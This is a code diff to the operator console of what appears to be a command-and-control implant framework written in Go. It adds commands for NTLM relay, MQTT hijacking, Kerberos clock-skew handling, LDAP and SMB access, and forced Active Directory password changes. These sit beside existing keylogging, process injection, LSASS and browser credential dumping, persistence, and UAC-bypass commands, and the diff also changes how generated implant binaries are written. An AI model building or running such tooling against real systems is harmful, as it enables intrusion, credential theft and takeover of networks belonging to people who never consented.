@@ -57,6 +57,7 @@ func (c *Commands) Handlers() map[string]CommandHandler {
 		"keylog":    c.cmdKeylog,
 		"inject":       c.cmdInject,
 		"ldap-enum":    c.cmdLDAPEnum,
+		"kerberos":     c.cmdKerberos,
 		"kerberoast":   c.cmdKerberoast,
 		"asreproast":   c.cmdASREPRoast,
 		"creds-dump":   c.cmdCredsDump,
@@ -64,6 +65,11 @@ func (c *Commands) Handlers() map[string]CommandHandler {
 		"smb":          c.cmdSMB,
 		"persist":      c.cmdPersist,
 		"privesc":      c.cmdPrivesc,
+		"mqtt":         c.cmdMQTT,
+		"relay":        c.cmdRelay,
+		"ldap":         c.cmdHostLDAP,
+		"ad":           c.cmdHostAD,
+		"host-smb":     c.cmdHostSMB,
 		"exit":         c.cmdExit,
 		"help":         c.cmdHelp,
 	}
@@ -459,7 +465,7 @@ func (c *Commands) cmdGenerate(args []string) error {
 			outPath = "implant.bin"
 		}
 	}
-	if err := os.WriteFile(outPath, resp.Binary, 0o755); err != nil {
+	if err := os.WriteFile(outPath, resp.Binary, 0o750); err != nil {
 		return fmt.Errorf("write %s: %w", outPath, err)
 	}
 	fmt.Printf("OK build_id=%s format=%s size=%d bytes → %s\n",
@@ -727,6 +733,8 @@ func (c *Commands) cmdHelp(_ []string) error {
   screenshot            - Take screenshot
   keylog <start|stop|dump> - Keylogger control
   ldap-enum <type> --domain <d> --dc <dc> - LDAP AD enumeration
+  kerberos skew --dc <host> [--user u] [--pass p] [--max-skew 5m] - Kerberos clock preflight (no session)
+  kerberos with-skew --dc <host> -- <cmd...> - run cmd under libfaketime to match DC clock
   kerberoast --domain <d> --dc <dc> --user <u> --pass <p>
   asreproast --domain <d> --dc <dc>
   creds-dump <lsass|sam|browser>
@@ -735,6 +743,11 @@ func (c *Commands) cmdHelp(_ []string) error {
   ldap-enum <query_type> --domain d --dc dc [--user u] [--pass p] [--hash h]
   persist <schtask|registry|service> [--name n] [--path p] [--trigger t]
   privesc <token|uac_fodhelper|uac_eventvwr> [--pid n] [--command c]
+  mqtt <sub|pub|healthcheck-hijack> ...  - Pre-implant MQTT (no session; see: mqtt help)
+  relay http <start|sessions|get|status> - Pre-implant HTTP NTLM relay (no session)
+  ldap <bind|enum|dangling> ... - Host-side LDAP (no session; see: ldap help)
+  host-smb <shares|ls|get> ...  - Host-side SMB (no session; implant smb still needs use)
+  ad password ...               - Host-side ForceChangePassword (see: ad help)
   tasks                 - List session tasks
   result <task-id>      - Get task result
   loot                  - List loot
